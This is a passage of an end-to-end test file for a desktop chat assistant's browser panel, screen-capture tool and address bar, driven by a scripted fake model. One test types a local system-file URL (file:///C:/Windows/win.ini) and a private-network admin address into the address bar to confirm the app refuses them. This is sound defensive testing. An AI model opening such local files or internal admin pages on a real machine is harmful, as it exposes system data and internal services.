  expect(tabsLine).toMatch(/tab \d+ \(duckduckgo\.com\), search results, in front[.;]/);
  expect(tabsLine).not.toContain('Search:');
  expect(tabsLine).not.toContain('train');
  expect(tabsLine).not.toContain('https://');
  expect(toolResult(calls[1])).toMatchObject({ success: false, displayText: expect.stringMatching(/^Didn't read duckduckgo\.com\/\?q=train\+times.*: a search engine's results$/) });
  // What works instead: web search finds the pages to open.
  expect(toolResult(calls[1]).error).toContain('To find pages to open, search with web_search');

  // A page: read as the person sees it, cited, its text the model's.
  from = fakeLlm.requests.length;
  // (An address asked for: Yap opens it itself.)
  await say(main, `Open ${FORT_JOY_URL}`);
  await expect(main.getByText('wiki.example.com is open beside the chat.')).toBeVisible({ timeout: 20_000 });
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'browser_read', args: {} }] }, { content: 'It marks every treasure chest [1].' }]);
  await main.getByRole('textbox', { name: 'Message' }).fill('What is this page about?');
  await main.getByRole('button', { name: 'Send' }).click();
  await expect(main.getByText('It marks every treasure chest')).toBeVisible({ timeout: 20_000 });
  calls = chatCalls(fakeLlm, from);
  const read = toolResult(calls[1]);
  expect(read).toMatchObject({ success: true, displayText: 'Read wiki.example.com/wiki/Fort_Joy beside the chat' });
  // (The search is one tab, this page the next, in front: each with its own number.)
  const pageTab = (await views(yap)).find((v) => v.key === KEY).tab;
  expect(read.data).toMatchObject({ tab: pageTab, title: 'Fort Joy - Example Wiki', url: FORT_JOY_URL, n: 1 });
  const [searchTab, thisTab] = read.data.tabs.map((t) => t.tab);
  expect(thisTab).toBe(pageTab);
  expect(searchTab).toBeLessThan(pageTab);
  expect(read.data.text).toContain('Every treasure chest marked');
  await expect(main.getByText('Read the page beside the chat')).toBeVisible();

  // A site the person named: its home page, though no search found it.
  from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'browser_tabs', args: { action: 'new', url: 'https://www.exampletube.com/' } }] }, { content: 'ExampleTube is open.' }]);
  await say(main, 'Open ExampleTube for me');
  await expect(main.getByText('ExampleTube is open.')).toBeVisible({ timeout: 20_000 });
  expect(toolResult(chatCalls(fakeLlm, from)[1])).toMatchObject({ success: true, displayText: 'Brought up exampletube.com beside the chat' });

  // No model gets offer_browser; Settings → General → Links: the browsers this
  // PC has registered, one picked, and the tab's Open in … names it.
  expect(calls[0].tools).not.toContain('offer_browser');
  await openSettings(main, 'General');
  const pick = main.getByRole('combobox', { name: 'Open links in' });
  await expect(pick.locator('option')).toHaveText(['Default browser', 'Brave', 'Firefox']);
  await pick.selectOption('Brave');
  await expect.poll(async () => (await yap.invoke('get_config')).openLinksIn).toBe('Brave');
  await closeSettings(main);
  expect(await yap.invoke('browser_label')).toBe('Brave');
  await expect(main.getByTestId('chat-page-open')).toHaveText('Open in Brave');
  const before = (await yap.invoke('e2e_opened_urls')).length;
  await main.getByTestId('chat-page-open').click();
  await expect.poll(async () => (await yap.invoke('e2e_opened_urls')).length).toBe(before + 1);
  // Back to Windows' default: "your browser" again.
  await setConfig(yap, main, { openLinksIn: '' });
  await expect(main.getByTestId('chat-page-open')).toHaveText('Open in your browser');
});

test('the + opens a new tab: an address or words go in its address bar, Back and Forward, and its data clears', async ({ yap, main, fakeLlm, shot }) => {
  await setConfig(yap, main, { ...chatConfig(fakeLlm), webSearchBrowser: 'duckduckgo' });
  // (An address asked for: Yap opens it itself, no model.)
  await ask(main, `Show me ${FORT_JOY_URL}`);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  // A page showing: the row is there with one tab, the page's title its name, and the +.
  const tabs = main.getByTestId('chat-panel-tab');
  await expect(tabs).toHaveCount(1);
  await expect(tabs.first()).toHaveText('Fort Joy - Example Wiki');
  const address = main.getByTestId('chat-page-address');
  await expect(address).toHaveValue(FORT_JOY_URL);

  // The +: a new tab, its address bar waiting, the pages this chat read offered.
  await main.getByTestId('chat-panel-new-tab').click();
  await expect(tabs).toHaveCount(2);
  await expect(tabs.last()).toHaveText('New tab');
  await expect(main.getByTestId('chat-page-new')).toBeVisible();
  await expect(main.getByTestId('chat-page-new').getByRole('button', { name: /Fort Joy - Example Wiki/ })).toBeVisible();
  await expect(address).toBeFocused();
  await expect(address).toHaveValue('');
  // Nothing made until there's somewhere to go.
  expect((await views(yap)).filter((v) => v.key.startsWith('page:new:'))).toEqual([]);
  await shot(main, '04-a-new-tab');

  // An address without https://: opened as one.
  await address.fill('wiki.example.com/wiki/Fort_Joy');
  await address.press('Enter');
  const fresh = async () => (await views(yap)).find((v) => v.key.startsWith('page:new:'));
  await expect.poll(async () => (await fresh())?.loaded, { timeout: 20_000 }).toBe(true);
  const key = (await fresh()).key;
  await expect(main.getByTestId('chat-page-new')).toHaveCount(0);
  await expect(tabs.last()).toHaveText('Fort Joy - Example Wiki');
  await expect(address).not.toBeFocused();
  await expect(address).toHaveValue(FORT_JOY_URL);

  // Words: a search on the person's engine, in the tab (the stand-in answers for it).
  await address.click();
  await expect(address).toHaveValue(FORT_JOY_URL);
  await address.fill('fort joy chests');
  await address.press('Enter');
  await expect.poll(async () => (await fresh())?.url).toBe('https://duckduckgo.com/?q=fort+joy+chests');
  await expect(address).toHaveValue('https://duckduckgo.com/?q=fort+joy+chests', { timeout: 20_000 });
  // Back to the page, and Forward again.
  const backBtn = main.getByTestId('chat-page').getByRole('button', { name: 'Back', exact: true });
  const fwdBtn = main.getByTestId('chat-page').getByRole('button', { name: 'Forward', exact: true });
  await expect(backBtn).toBeEnabled({ timeout: 20_000 });
  await backBtn.click();
  await expect(address).toHaveValue(FORT_JOY_URL, { timeout: 20_000 });
  await expect(fwdBtn).toBeEnabled();
  await fwdBtn.click();
  await expect(address).toHaveValue('https://duckduckgo.com/?q=fort+joy+chests', { timeout: 20_000 });

  // Never another scheme, never this PC: said under the bar, nothing opened.
  await address.click();
  await address.fill('file:///C:/Windows/win.ini');
  await address.press('Enter');
  await expect(main.getByTestId('chat-page-address-error')).toContainText('Only web pages open here');
  await address.fill('192.168.1.5/admin');
  await address.press('Enter');
  await expect(main.getByTestId('chat-page-address-error')).toBeVisible();
  expect((await fresh()).url).toBe('https://duckduckgo.com/?q=fort+joy+chests');
  // Esc puts the address back.
  await address.press('Escape');
  await expect(main.getByTestId('chat-page-address-error')).toHaveCount(0);
  await expect(address).toHaveValue('https://duckduckgo.com/?q=fort+joy+chests');

  // Its tab shown again opens where the address bar took it.
  await tabs.first().click();
  await expect(address).toHaveValue(FORT_JOY_URL);
  await tabs.last().click();
  await expect(address).toHaveValue('https://duckduckgo.com/?q=fort+joy+chests');
  expect((await fresh()).key).toBe(key);

  // What the pages keep (their own profile) clears from Delete some of your data.
  await backBtn.click();
  await expect(address).toHaveValue(FORT_JOY_URL, { timeout: 20_000 });
  const probe = (script) => yap.invoke('e2e_page_view_eval', { key, script }).then((raw) => JSON.parse(raw));
  await probe("localStorage.setItem('yap-pages-probe','1'); 'ok'");
  expect(await probe("localStorage.getItem('yap-pages-probe')")).toBe('1');
  await openSettings(main, 'Privacy & data');
  const yours = settingsDialog(main).getByRole('group', { name: 'Your data' });
  await yours.scrollIntoViewIfNeeded();
  await yours.getByRole('button', { name: 'Delete…', exact: true }).click();
  const picker = main.getByRole('dialog', { name: 'Delete some of your data' });
  await expect(picker).toContainText('Cookies, sign-ins and site data from the web pages opened beside the chat');
  await picker.getByRole('checkbox', { name: /^Pages beside the chat/ }).check();
  await picker.getByRole('button', { name: 'Delete…', exact: true }).click();
  const confirm = main.getByRole('alertdialog');
  await expect(confirm.getByRole('list', { name: 'What goes' })).toContainText('Pages beside the chat');
  await confirm.getByRole('button', { name: 'Delete', exact: true }).click();
  await expect(main.getByRole('status').filter({ hasText: 'Deleted from this PC' })).toContainText('Pages beside the chat');
  await closeSettings(main);
  // The page stays open; what it kept is gone.
  await expect.poll(() => probe("localStorage.getItem('yap-pages-probe')"), { timeout: 10_000 }).toBe(null);
  expect(await probe('document.title')).toBe('Fort Joy - Example Wiki');
});

test('the title bar’s browser button (Ctrl+Shift+B) opens a new tab, the same tab again, or closes the panel', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  await openView(main, 'Chat');
  await main.getByRole('button', { name: 'New chat' }).first().click();
  await expect(main.getByTestId('chat-doc')).toHaveCount(0);
  const btn = main.getByTestId('chat-browser-button');
  await expect(btn).toHaveAttribute('aria-pressed', 'false');
  // Nothing open: a new tab, its address bar waiting.
  await btn.click();
  await expect(main.getByTestId('chat-page-new')).toBeVisible();
  await expect(main.getByTestId('chat-page-address')).toBeFocused();
  await expect(btn).toHaveAttribute('aria-pressed', 'true');
  // Again: the panel closes.
  await btn.click();
  await expect(main.getByTestId('chat-doc')).toHaveCount(0);
  await expect(btn).toHaveAttribute('aria-pressed', 'false');
  // Ctrl+Shift+B: the same tab back, not another.
  await main.keyboard.press('Control+Shift+B');
  await expect(main.getByTestId('chat-page-new')).toBeVisible();
  await expect(main.getByTestId('chat-panel-tab')).toHaveCount(1);
  await main.keyboard.press('Control+Shift+B');
  await expect(main.getByTestId('chat-doc')).toHaveCount(0);
  // Only while Chat shows.
  await openView(main, 'Home');
  await expect(btn).toHaveCount(0);
});

test('"Open YouTube" and "search for train tickets…" open beside the chat by Yap itself, no model', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, { ...chatConfig(fakeLlm), webSearchBrowser: 'duckduckgo' });
  const from = fakeLlm.requests.length;
  // A site asked for by name: its home page, at once.
  await ask(main, 'Can you open up YouTube for me?');
  await expect(main.getByText('YouTube is open beside the chat.')).toBeVisible({ timeout: 20_000 });
  await expect(main.getByTestId('chat-page-address')).toHaveValue('https://www.youtube.com/', { timeout: 20_000 });
  await expect(main.getByText('Brought up a page')).toBeVisible();
  // A search asked for that the free sources don't cover (travel): the search itself, on the person's engine.
  await say(main, 'Search for train tickets from Kellbrook to Port Ellis.');
  await expect(main.getByText('The search for “train tickets from Kellbrook to Port Ellis” is open beside the chat, on DuckDuckGo.')).toBeVisible({ timeout: 20_000 });
  await expect(main.getByTestId('chat-page-address')).toHaveValue('https://duckduckgo.com/?q=train+tickets+from+Kellbrook+to+Port+Ellis', { timeout: 20_000 });
  // No model was asked for either; both are kept with their answers.
  expect(chatCalls(fakeLlm, from)).toEqual([]);
  await expectStore(yap, 'chats.json', (s) =>
    s.conversations.some((c) => c.messages.some((m) => m.pages?.[0]?.url === 'https://www.youtube.com/') && c.messages.some((m) => m.pages?.[0]?.title === 'Search: train tickets from Kellbrook to Port Ellis'))
  );
});

test('look_at_screen: a model that reads images sees every monitor, Yap left out; it is never told it cannot see', async ({ yap, main, fakeLlm }) => {
  // ("vision" in the fake's id: a model that reads images. The web off: the screen isn't the web's.)
  await setConfig(yap, main, { webSearch: false, assistantScreen: true, memoryLearnChats: false, llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-vision-chat' } } });
  // Two fake monitors (a test run never captures the real screen).
  await yap.invoke('e2e_snip', {
    monitors: [
      { x: 0, y: 0, width: 1280, height: 720, scale: 1, hdr: false, whiteNits: 80 },
      { x: 1280, y: 0, width: 1280, height: 720, scale: 1, hdr: false, whiteNits: 80 },
    ],
    windows: [],
    start: false,
  });
  // (A page left open by the last test: the panel closed, so the chat list shows.)
  await openView(main, 'Chat');
  const closePanel = main.getByTestId('chat-page').getByRole('button', { name: 'Close the panel' });
  if (await closePanel.count()) await closePanel.click();
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'look_at_screen', args: {} }] }, { content: 'Those are the speakers on your other monitor: a 3.5mm input.' }]);
  await ask(main, 'Here are the speakers, can you have a look?');
  await expect(main.getByText('Those are the speakers on your other monitor')).toBeVisible({ timeout: 20_000 });
  const calls = chatCalls(fakeLlm, from);
  expect(calls[0].tools).toContain('look_at_screen');
  expect(calls[0].system).toContain("Never say you can't see it, and never ask them to snip it: look.");
  // Its result, then the two monitors as the user's message.
  expect(toolResult(calls[1])).toMatchObject({ success: true, data: { monitors: 2 }, displayText: 'Looked at your screen (2 monitors)' });
  const parts = calls[1].messages.at(-1).content;
  expect(parts.filter((p) => p.type === 'image_url')).toHaveLength(2);
  expect(parts.find((p) => p.type === 'text').text).toContain('Monitor 1 of 2 as it is now');
  await expect(main.getByText('Looked at your screen', { exact: true })).toBeVisible();
  // What was looked at shows with the question, in the screenshot frame, and is kept with it.
  await expect(main.getByRole('group', { name: 'Screenshots' }).last().getByRole('button', { name: /^Screenshot,/ })).toHaveCount(2);
  await expectStore(yap, 'chats.json', (s) =>
    s.conversations.some((c) => c.messages.some((m) => m.role === 'user' && m.text.startsWith('Here are the speakers') && m.images?.filter((i) => i.source === 'screen').length === 2))
  );
});

test('asked out loud with Chat in view: Yap opens the page itself and the model looks at the screen and the page; from another app, neither', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, { ...chatConfig(fakeLlm), assistantScreen: true, llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-vision-chat' } } });
  await yap.invoke('e2e_snip', { monitors: [{ x: 0, y: 0, width: 1280, height: 720, scale: 1, hdr: false, whiteNits: 80 }], windows: [], start: false });
  await openView(main, 'Chat');
  const closePanel = main.getByTestId('chat-page').getByRole('button', { name: 'Close the panel' });
  if (await closePanel.count()) await closePanel.click();
  await main.getByRole('button', { name: 'New chat' }).first().click();
  const from = fakeLlm.requests.length;
  // "Show me <address>", asked out loud with Chat in front: Yap opens it beside the chat, no model.
  await yap.invoke('e2e_assistant_ask', { text: `Show me ${FORT_JOY_URL}`, listenMs: 0 });
  await expect(main.getByText('wiki.example.com is open beside the chat.')).toBeVisible({ timeout: 20_000 });
  await expect(main.getByTestId('chat-page-address')).toHaveValue(FORT_JOY_URL, { timeout: 20_000 });
  expect(chatCalls(fakeLlm, from)).toEqual([]);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  // "Have a look": the model looks itself (Yap's window is the one in front, so no window look first).
  fakeLlm.scriptChat([{ tools: [{ name: 'look_at_screen', args: {} }] }, { content: 'That is the wiki article open beside the chat.' }]);
  await yap.invoke('e2e_assistant_ask', { text: "Can you have a look at what I'm looking at?", listenMs: 0 });
  await expect(main.getByText('That is the wiki article open beside the chat.')).toBeVisible({ timeout: 40_000 });
  const calls = chatCalls(fakeLlm, from);
  expect(calls[0].tools).toContain('look_at_screen');
  expect(calls[0].tools).toContain('browser_navigate');
  expect(toolResult(calls[1])).toMatchObject({ success: true, displayText: 'Looked at your screen and the page beside the chat' });
  expect(fakeLlm.requests.slice(from).some((r) => r.kind === 'screenQuestion')).toBe(false);
  // Its pictures show with the question asked out loud.
  await expect(main.getByRole('group', { name: 'Screenshots' }).last().getByRole('button', { name: /^Screenshot,/ })).toHaveCount(2);
  // From another app: no page opened by Yap, and neither the page tools nor the screen look for the model.
  await yap.invoke('e2e_focus', { focused: false });
  try {
    const away = fakeLlm.requests.length;
    fakeLlm.scriptChat([{ content: 'You can open YouTube in your browser.' }]);
    await yap.invoke('e2e_assistant_ask', { text: 'Open YouTube', listenMs: 0 });
    await expect.poll(() => chatCalls(fakeLlm, away).length, { timeout: 20_000 }).toBeGreaterThanOrEqual(1);
    const tools = chatCalls(fakeLlm, away)[0].tools;
    expect(tools).not.toContain('browser_navigate');
    expect(tools).not.toContain('look_at_screen');
  } finally {
    await yap.invoke('e2e_focus', { focused: true });
  }
  if (await closePanel.count()) await closePanel.click();
});

test('look_at_screen sees the page open beside the chat too, as its own picture (the monitors grey Yap out)', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, { ...chatConfig(fakeLlm), assistantScreen: true, llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-vision-chat' } } });
  await yap.invoke('e2e_snip', { monitors: [{ x: 0, y: 0, width: 1280, height: 720, scale: 1, hdr: false, whiteNits: 80 }], windows: [], start: false });
  // A page open beside the chat.
  fakeLlm.scriptChat([{ tools: [{ name: 'browser_navigate', args: { url: FORT_JOY_URL } }] }, { content: 'It’s open beside the chat.' }]);
  await ask(main, `Bring up the wiki page ${FORT_JOY_URL}`);
  await expect(main.getByTestId('chat-page-address')).toHaveValue(FORT_JOY_URL, { timeout: 40_000 });
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  // "Have a look": the monitor, and the page as it is in the panel.
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'look_at_screen', args: {} }] }, { content: 'That page is the wiki article you have open.' }]);
  await say(main, 'Have a look at this');
  await expect(main.getByText('That page is the wiki article you have open.')).toBeVisible({ timeout: 40_000 });
  const calls = chatCalls(fakeLlm, from);
  expect(toolResult(calls[1])).toMatchObject({ success: true, data: { monitors: 1 }, displayText: 'Looked at your screen and the page beside the chat' });
  const parts = calls[1].messages.at(-1).content;
  expect(parts.filter((p) => p.type === 'image_url')).toHaveLength(2);
  const texts = parts.filter((p) => p.type === 'text').map((p) => p.text).join(' ');
  expect(texts).toContain("Yap's own window greyed out: the page beside the chat comes as its own picture");
  expect(texts).toContain('The page open beside the chat (wiki.example.com), as it is now.');
  // Both shown with the question, in the screenshot frame.
  await expect(main.getByRole('group', { name: 'Screenshots' }).last().getByRole('button', { name: /^Screenshot,/ })).toHaveCount(2);
  const closePanel = main.getByTestId('chat-page').getByRole('button', { name: 'Close the panel' });
  if (await closePanel.count()) await closePanel.click();
});
